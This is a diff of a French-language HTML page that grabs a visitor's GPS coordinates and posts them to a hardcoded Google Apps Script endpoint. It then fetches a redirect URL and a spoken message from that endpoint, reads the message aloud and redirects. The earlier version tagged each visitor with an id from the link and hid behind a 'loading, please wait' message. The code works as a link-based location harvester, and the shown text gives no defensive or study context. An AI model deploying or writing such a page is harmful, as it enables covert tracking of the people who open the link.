@@ -1,52 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
   <title>Localisation</title>
   <script>
-    async function sendLocation() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const id = urlParams.get('id'); // ID dans l'URL ?id=...
+    const scriptURL = "https://script.google.com/macros/s/AKfycbyzp5OBxiya8wyAF-miJ5pzz29hzHCtcFDNDpTj77gm7DSU6UUYLO0jGFLvc3C98C_l/exec";
 
+    async function sendLocation() {
       try {
-        const position = await new Promise((resolve, reject) =>
-          navigator.geolocation.getCurrentPosition(resolve, reject)
-        );
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
 
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbyW-L2Bil_TN7XGJCMo5FHPDVOLwDFwtDDJRFYJ8KxXrWPE5zn3egCUFbP9xypv5pkp/exec';
+        // Envoi GPS à Apps Script
+        await fetch(`${scriptURL}?id=test&latitude=${latitude}&longitude=${longitude}`, {
+          method: "POST"
+        });
 
-        const data = new FormData();
-        data.append('id', id);
-        data.append('latitude', latitude);
-        data.append('longitude', longitude);
+        // Récupération de l'URL
+        const urlResp = await fetch(`${scriptURL}?data=url`);
+        const urlText = await urlResp.text();
 
-        // 1. Envoi des coordonnées GPS
-        await fetch(scriptURL, { method: 'POST', body: data });
+        // Récupération du message vocal
+        const msgResp = await fetch(`${scriptURL}?data=message`);
+        const msgText = await msgResp.text();
 
-        // 2. Récupération de l’URL + message
-        const response = await fetch(scriptURL + '?getRedirectURL=true');
-        const json = await response.json();
+        // Lecture vocale
+        const utterance = new SpeechSynthesisUtterance(msgText);
+        speechSynthesis.speak(utterance);
 
-        // 3. Lecture audio du message
-        const synth = window.speechSynthesis;
-        const utter = new SpeechSynthesisUtterance(json.message);
-        utter.lang = "fr-FR";
-        synth.speak(utter);
-
-        // 4. Redirection après la lecture
-        utter.onend = () => {
-          let finalURL = json.redirect.trim();
-          if (!finalURL.startsWith('http')) {
-            finalURL = 'https://' + finalURL;
-          }
-          window.location.replace(finalURL);
-        };
+        // Redirection
+        window.location.href = urlText;
 
       } catch (error) {
-        alert("Impossible d’obtenir la localisation : " + error.message);
+        alert("Erreur : " + error.message);
       }
     }
 
@@ -54,6 +43,6 @@
   </script>
 </head>
 <body>
-  <p>Chargement en cours... Veuillez patienter.</p>
+  <h1>Envoi de la localisation...</h1>
 </body>
 </html>
